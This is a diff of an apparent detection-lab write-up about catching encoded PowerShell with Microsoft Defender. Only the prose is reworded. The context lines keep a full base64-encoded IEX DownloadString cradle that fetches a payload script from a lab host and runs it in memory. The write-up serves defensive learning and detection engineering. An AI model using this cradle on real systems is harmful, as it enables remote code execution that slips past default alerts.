@@ -8,7 +8,7 @@
 
 ## What I ran
 
-On victim-a, as `sfazl`, I ran an encoded PowerShell download cradle. Here's the command line Defender caught:
+On victim-a, as `sfazl`, I ran an encoded PowerShell download cradle. The command line Defender captured:
 
 ```
 powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA3ADQALgAxADMANgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
@@ -19,7 +19,7 @@ powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAd
 
 ## Decoding it
 
-The base64 decodes to a download-and-run cradle. I decoded it **only to read it**. I never run decoded attacker commands:
+The base64 decodes to a download-and-run cradle. I decoded it **only to read it** — I never run decoded attacker commands:
 
 ```powershell
 [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("PASTE_BASE64"))
@@ -51,24 +51,24 @@ DeviceProcessEvents
 | order by Timestamp desc
 ```
 
-I ran the encoded command a few times during testing. Each run was captured with its full command line:
+I ran the encoded command several times during testing. Each run was captured with its full command line:
 
 ![Encoded PowerShell occurrences detail](../screenshots/08-stage2-encoded-ps-detail.png)
 *Several encoded PowerShell runs in DeviceProcessEvents, all the same cradle, all as sfazl.*
 
 ## What Defender did
 
-The binary, `powershell.exe`, is the real signed Microsoft file (VirusTotal 0/70). So this isn't malware — it's a trusted tool being abused. That's called LOLBin abuse. Default Defender raised **no incident** for the encoded command. The decoded payload looked like normal web traffic, and on its own it stayed under the threshold.
+The binary, `powershell.exe`, is the real signed Microsoft file (VirusTotal 0/70). This is not malware — it is a trusted tool being abused, known as LOLBin abuse. Default Defender raised **no incident** for the encoded command. The decoded payload looked like normal web traffic, and on its own it stayed under the threshold.
 
 This is what my first custom rule (Encoded PowerShell Execution) was built to catch. See [detections/custom-detection-rules.md](../detections/custom-detection-rules.md#rule-1--encoded-powershell-execution).
 
 ## Tier 1 triage
 
-- **Binary:** signed Microsoft `powershell.exe`, VT 0/70. Not malware — but how it's used is the problem.
-- **Command line:** `-EncodedCommand` with a base64 blob is a clear sign of hiding something. Decoding shows an `IEX ... DownloadString` cradle reaching an internal host on port 80.
-- **The line I'd use:** "The file is clean, the behavior is not." Encoding, plus a remote download, plus running it in memory with `IEX`, is a textbook execution step.
+- **Binary:** signed Microsoft `powershell.exe`, VT 0/70. Not malware — but the way it is used is the problem.
+- **Command line:** `-EncodedCommand` with a base64 blob is a clear sign of obfuscation. Decoding shows an `IEX ... DownloadString` cradle reaching an internal host on port 80.
+- **Key point:** the file is clean, the behavior is not. Encoding, plus a remote download, plus running it in memory with `IEX`, is a textbook execution step.
 - **Verdict:** True Positive.
 
 ## Detection takeaway
 
-Encoded PowerShell is cheap to catch from `DeviceProcessEvents`. Match `powershell.exe` with the `-EncodedCommand` / `-enc` / `-e` flags, and skip the system account to cut noise. Decoding it to read it is the analyst skill that turns a flagged command into a confirmed cradle.
+Encoded PowerShell is cheap to catch from `DeviceProcessEvents`. Match `powershell.exe` with the `-EncodedCommand` / `-enc` / `-e` flags, and skip the system account to cut noise. Decoding the command to read it is the analyst skill that turns a flagged command into a confirmed cradle.
